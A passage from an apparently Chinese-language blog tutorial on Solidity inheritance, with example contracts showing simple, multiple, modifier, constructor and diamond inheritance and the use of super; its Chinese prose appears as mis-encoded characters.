balanceOf;</span><br></pre></td></tr></table></figure><h3 id="ç®€å•ç»§æ‰¿">ç®€å•ç»§æ‰¿</h3><p>æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªç®€å•çš„çˆ·çˆ·åˆçº¦<code>Yeye</code>ï¼Œé‡Œé¢åŒ…å«1ä¸ª<code>Log</code>äº‹ä»¶å’Œ3ä¸ª<code>function</code>: <code>hip()</code>, <code>pop()</code>, <code>yeye()</code>ï¼Œè¾“å‡ºéƒ½æ˜¯â€Yeyeâ€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract Yeye &#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line"></span><br><span class="line">    // å®šä¹‰3ä¸ªfunction: hip(), pop(), yeye()ï¼ŒLogå€¼ä¸ºYeyeã€‚</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†å®šä¹‰ä¸€ä¸ªçˆ¸çˆ¸åˆçº¦<code>Baba</code>ï¼Œè®©ä»–ç»§æ‰¿<code>Yeye</code>åˆçº¦ï¼Œè¯­æ³•å°±æ˜¯<code>contract Baba is Yeye</code>ï¼Œéå¸¸ç›´è§‚ã€‚åœ¨<code>Baba</code>åˆçº¦é‡Œï¼Œæˆ‘ä»¬é‡å†™ä¸€ä¸‹<code>hip()</code>å’Œ<code>pop()</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼ŒåŠ ä¸Š<code>override</code>å…³é”®å­—ï¼Œå¹¶å°†ä»–ä»¬çš„è¾“å‡ºæ”¹ä¸º<code>â€Babaâ€</code>ï¼›å¹¶ä¸”åŠ ä¸€ä¸ªæ–°çš„å‡½æ•°<code>baba</code>ï¼Œè¾“å‡ºä¹Ÿæ˜¯<code>â€Babaâ€</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // ç»§æ‰¿ä¸¤ä¸ªfunction: hip()å’Œpop()ï¼Œè¾“å‡ºæ”¹ä¸ºBabaã€‚</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„æµ‹è¯•ä»£ç <code>Yeye.sol</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Yeye&#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line">    // å®šä¹‰3ä¸ªfunction: hip(), pop(), yeye()ï¼ŒLogå€¼ä¸ºYeyeã€‚</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // ç»§æ‰¿ä¸¤ä¸ªfunction: hip()å’Œpop()ï¼Œè¾“å‡ºæ”¹ä¸ºBabaã€‚</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126213523593.png" alt="image-20250126213523593"></p><h3 id="å¤šé‡ç»§æ‰¿">å¤šé‡ç»§æ‰¿</h3><p><code>Solidity</code>çš„åˆçº¦å¯ä»¥ç»§æ‰¿å¤šä¸ªåˆçº¦ã€‚è§„åˆ™ï¼š</p><ol><li>ç»§æ‰¿æ—¶è¦æŒ‰è¾ˆåˆ†æœ€é«˜åˆ°æœ€ä½çš„é¡ºåºæ’ã€‚æ¯”å¦‚æˆ‘ä»¬å†™ä¸€ä¸ª<code>Erzi</code>åˆçº¦ï¼Œç»§æ‰¿<code>Yeye</code>åˆçº¦å’Œ<code>Baba</code>åˆçº¦ï¼Œé‚£ä¹ˆå°±è¦å†™æˆ<code>contract Erzi is Yeye, Baba</code>ï¼Œè€Œä¸èƒ½å†™æˆ<code>contract Erzi is Baba, Yeye</code>ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™ã€‚</li><li>å¦‚æœæŸä¸€ä¸ªå‡½æ•°åœ¨å¤šä¸ªç»§æ‰¿çš„åˆçº¦é‡Œéƒ½å­˜åœ¨ï¼Œæ¯”å¦‚ä¾‹å­ä¸­çš„<code>hip()</code>å’Œ<code>pop()</code>ï¼Œåœ¨å­åˆçº¦é‡Œå¿…é¡»é‡å†™ï¼Œä¸ç„¶ä¼šæŠ¥é”™ã€‚</li><li>é‡å†™åœ¨å¤šä¸ªçˆ¶åˆçº¦ä¸­éƒ½é‡åçš„å‡½æ•°æ—¶ï¼Œ<code>override</code>å…³é”®å­—åé¢è¦åŠ ä¸Šæ‰€æœ‰çˆ¶åˆçº¦åå­—ï¼Œä¾‹å¦‚<code>override(Yeye, Baba)</code>ã€‚</li></ol><p>ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // ç»§æ‰¿ä¸¤ä¸ªfunction: hip()å’Œpop()ï¼Œè¾“å‡ºå€¼ä¸ºErziã€‚</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>Erzi</code>åˆçº¦é‡Œé¢é‡å†™äº†<code>hip()</code>å’Œ<code>pop()</code>ä¸¤ä¸ªå‡½æ•°ï¼Œå°†è¾“å‡ºæ”¹ä¸º<code>â€Erziâ€</code>ï¼Œå¹¶ä¸”è¿˜åˆ†åˆ«ä»<code>Yeye</code>å’Œ<code>Baba</code>åˆçº¦ç»§æ‰¿äº†<code>yeye()</code>å’Œ<code>baba()</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p><p>å®Œæ•´çš„æµ‹è¯•ä»£ç <code>Yeye.sol</code>ï¼Œå®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Yeye&#123;</span><br><span class="line">    event Log(string msg);</span><br><span class="line">    // å®šä¹‰3ä¸ªfunction: hip(), pop(), yeye()ï¼ŒLogå€¼ä¸ºYeyeã€‚</span><br><span class="line">    function hip() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function yeye() public virtual &#123;</span><br><span class="line">        emit Log(&quot;Yeye&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Baba is Yeye&#123;</span><br><span class="line">    // ç»§æ‰¿ä¸¤ä¸ªfunction: hip()å’Œpop()ï¼Œè¾“å‡ºæ”¹ä¸ºBabaã€‚</span><br><span class="line">    function hip() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function baba() public virtual&#123;</span><br><span class="line">        emit Log(&quot;Baba&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Erzi is Yeye, Baba&#123;</span><br><span class="line">    // ç»§æ‰¿ä¸¤ä¸ªfunction: hip()å’Œpop()ï¼Œè¾“å‡ºå€¼ä¸ºErziã€‚</span><br><span class="line">    function hip() public virtual override(Yeye, Baba)&#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pop() public virtual override(Yeye, Baba) &#123;</span><br><span class="line">        emit Log(&quot;Erzi&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126213416543.png" alt="image-20250126213416543"></p><h3 id="ä¿®é¥°å™¨çš„ç»§æ‰¿">ä¿®é¥°å™¨çš„ç»§æ‰¿</h3><p><code>Solidity</code>ä¸­çš„ä¿®é¥°å™¨ï¼ˆ<code>Modifier</code>ï¼‰åŒæ ·å¯ä»¥ç»§æ‰¿ï¼Œç”¨æ³•ä¸å‡½æ•°ç»§æ‰¿ç±»ä¼¼ï¼Œåœ¨ç›¸åº”çš„åœ°æ–¹åŠ <code>virtual</code>å’Œ<code>override</code>å…³é”®å­—å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢«2é™¤å’Œè¢«3é™¤çš„å€¼ï¼Œä½†æ˜¯ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯2å’Œ3çš„å€æ•°</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢«2é™¤å’Œè¢«3é™¤çš„å€¼</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Identifier</code>åˆçº¦å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­ä½¿ç”¨çˆ¶åˆçº¦ä¸­çš„<code>exactDividedBy2And3</code>ä¿®é¥°å™¨ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨<code>override</code>å…³é”®å­—é‡å†™ä¿®é¥°å™¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier exactDividedBy2And3(uint _a) override &#123;</span><br><span class="line">    _;</span><br><span class="line">    require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126214328979.png" alt="image-20250126214328979"></p><p>å®Œæ•´çš„æµ‹è¯•ä»£ç <code>Base1.sol</code>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Base1 &#123;</span><br><span class="line">    modifier exactDividedBy2And3(uint _a) virtual &#123;</span><br><span class="line">        require(_a % 2 == 0 &amp;&amp; _a % 3 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Identifier is Base1 &#123;</span><br><span class="line"></span><br><span class="line">    //è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢«2é™¤å’Œè¢«3é™¤çš„å€¼ï¼Œä½†æ˜¯ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯2å’Œ3çš„å€æ•°</span><br><span class="line">    function getExactDividedBy2And3(uint _dividend) public exactDividedBy2And3(_dividend) pure returns(uint, uint) &#123;</span><br><span class="line">        return getExactDividedBy2And3WithoutModifier(_dividend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //è®¡ç®—ä¸€ä¸ªæ•°åˆ†åˆ«è¢«2é™¤å’Œè¢«3é™¤çš„å€¼</span><br><span class="line">    function getExactDividedBy2And3WithoutModifier(uint _dividend) public pure returns(uint, uint)&#123;</span><br><span class="line">        uint div2 = _dividend / 2;</span><br><span class="line">        uint div3 = _dividend / 3;</span><br><span class="line">        return (div2, div3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ„é€ å‡½æ•°çš„ç»§æ‰¿">æ„é€ å‡½æ•°çš„ç»§æ‰¿</h3><p>å­åˆçº¦æœ‰ä¸¤ç§æ–¹æ³•ç»§æ‰¿çˆ¶åˆçº¦çš„æ„é€ å‡½æ•°ã€‚ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œçˆ¶åˆçº¦<code>A</code>é‡Œé¢æœ‰ä¸€ä¸ªçŠ¶æ€å˜é‡<code>a</code>ï¼Œå¹¶ç”±æ„é€ å‡½æ•°çš„å‚æ•°æ¥ç¡®å®šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// æ„é€ å‡½æ•°çš„ç»§æ‰¿</span><br><span class="line">abstract contract A &#123;</span><br><span class="line">    uint public a;</span><br><span class="line"></span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>åœ¨ç»§æ‰¿æ—¶å£°æ˜çˆ¶æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š<code>contract B is A(6)</code></li><li>åœ¨å­åˆçº¦çš„æ„é€ å‡½æ•°ä¸­å£°æ˜æ„é€ å‡½æ•°çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„æµ‹è¯•ä»£ç <code>A.sol</code>å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract A&#123;</span><br><span class="line">    uint public a;</span><br><span class="line">    constructor(uint _a) &#123;</span><br><span class="line">        a = _a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract C is A &#123;</span><br><span class="line">    constructor(uint _c) A(_c * _c) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250126214956006.png" alt="image-20250126214956006"></p><h3 id="è°ƒç”¨çˆ¶åˆçº¦çš„å‡½æ•°">è°ƒç”¨çˆ¶åˆçº¦çš„å‡½æ•°</h3><p>å­åˆçº¦æœ‰ä¸¤ç§æ–¹å¼è°ƒç”¨çˆ¶åˆçº¦çš„å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨å’Œåˆ©ç”¨<code>super</code>å…³é”®å­—ã€‚</p><ol><li>ç›´æ¥è°ƒç”¨ï¼šå­åˆçº¦å¯ä»¥ç›´æ¥ç”¨<code>çˆ¶åˆçº¦å.å‡½æ•°å()</code>çš„æ–¹å¼æ¥è°ƒç”¨çˆ¶åˆçº¦å‡½æ•°ï¼Œä¾‹å¦‚<code>Yeye.pop()</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callParent() public&#123;</span><br><span class="line">    Yeye.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>super</code>å…³é”®å­—ï¼šå­åˆçº¦å¯ä»¥åˆ©ç”¨<code>super.å‡½æ•°å()</code>æ¥è°ƒç”¨æœ€è¿‘çš„çˆ¶åˆçº¦å‡½æ•°ã€‚<code>Solidity</code>ç»§æ‰¿å…³ç³»æŒ‰å£°æ˜æ—¶ä»å³åˆ°å·¦çš„é¡ºåºæ˜¯ï¼š<code>contract Erzi is Yeye, Baba</code>ï¼Œé‚£ä¹ˆ<code>Baba</code>æ˜¯æœ€è¿‘çš„çˆ¶åˆçº¦ï¼Œ<code>super.pop()</code>å°†è°ƒç”¨<code>Baba.pop()</code>è€Œä¸æ˜¯<code>Yeye.pop()</code>ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function callParentSuper() public&#123;</span><br><span class="line">    // å°†è°ƒç”¨æœ€è¿‘çš„çˆ¶åˆçº¦å‡½æ•°ï¼ŒBaba.pop()</span><br><span class="line">    super.pop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é’»çŸ³ç»§æ‰¿">é’»çŸ³ç»§æ‰¿</h3><p>åœ¨é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œé’»çŸ³ç»§æ‰¿ï¼ˆè±å½¢ç»§æ‰¿ï¼‰æŒ‡ä¸€ä¸ªæ´¾ç”Ÿç±»åŒæ—¶æœ‰ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„åŸºç±»ã€‚</p><p>åœ¨å¤šé‡+è±å½¢ç»§æ‰¿é“¾æ¡ä¸Šä½¿ç”¨<code>super</code>å…³é”®å­—æ—¶ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä½¿ç”¨<code>super</code>ä¼šè°ƒç”¨ç»§æ‰¿é“¾æ¡ä¸Šçš„æ¯ä¸€ä¸ªåˆçº¦çš„ç›¸å…³å‡½æ•°ï¼Œè€Œä¸æ˜¯åªè°ƒç”¨æœ€è¿‘çš„çˆ¶åˆçº¦ã€‚</p><p>æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªåˆçº¦<code>God</code>ï¼Œå†å†™<code>Adam</code>å’Œ<code>Eve</code>ä¸¤ä¸ªåˆçº¦ç»§æ‰¿<code>God</code>åˆçº¦ï¼Œæœ€åè®©åˆ›å»ºåˆçº¦<code>people</code>ç»§æ‰¿è‡ª<code>Adam</code>å’Œ<code>Eve</code>ï¼Œæ¯ä¸ªåˆçº¦éƒ½æœ‰<code>foo</code>å’Œ<code>bar</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">/* ç»§æ‰¿æ ‘ï¼š</span><br><span class="line">  God</span><br><span class="line"> /  \</span><br><span class="line">Adam Eve</span><br><span class="line"> \  /</span><br><span class="line">people</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">contract God &#123;</span><br><span class="line">    event Log(string message);</span><br><span class="line"></span><br><span class="line">    function foo() public virtual &#123;</span><br><span class="line">        emit Log(&quot;God.foo called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual &#123;</span><br><span class="line">        emit Log(&quot;God.bar called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Adam is God &#123;</span><br><span class="line">    function foo() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Adam.foo called&quot;);</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Adam.bar called&quot;);</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Eve is God &#123;</span><br><span class="line">    function foo() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Eve.foo called&quot;);</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public virtual override &#123;</span><br><span class="line">        emit Log(&quot;Eve.bar called&quot;);</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract people is Adam, Eve &#123;</span><br><span class="line">    function foo() public override(Adam, Eve) &#123;</span><br><span class="line">        super.foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() public override(Adam, Eve) &#123;</span><br><span class="line">        super.bar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè°ƒç”¨åˆçº¦<code>people</code>ä¸­çš„<code>super.bar()</code>ä¼šä¾æ¬¡è°ƒç”¨<code>Eve</code>ã€<code>Adam</code>ï¼Œæœ€åæ˜¯<code>God</code>åˆçº¦ã€‚</p><p>è™½ç„¶<code>Eve</code>ã€<code>Adam</code>éƒ½æ˜¯<code>God</code>çš„å­åˆçº¦ï¼Œä½†æ•´ä¸ªè¿‡ç¨‹ä¸­<code>God</code>åˆçº¦åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ã€‚åŸå› æ˜¯<code>Solidity</code>å€Ÿé‰´äº†Pythonçš„æ–¹å¼ï¼Œå¼ºåˆ¶ä¸€ä¸ªç”±åŸºç±»æ„æˆçš„DAGï¼ˆæœ‰å‘æ— ç¯å›¾ï¼‰ä½¿å…¶ä¿è¯ä¸€ä¸ªç‰¹å®šçš„é¡ºåºã€‚æ›´å¤šç»†èŠ‚ä½ å¯ä»¥æŸ¥é˜…<a 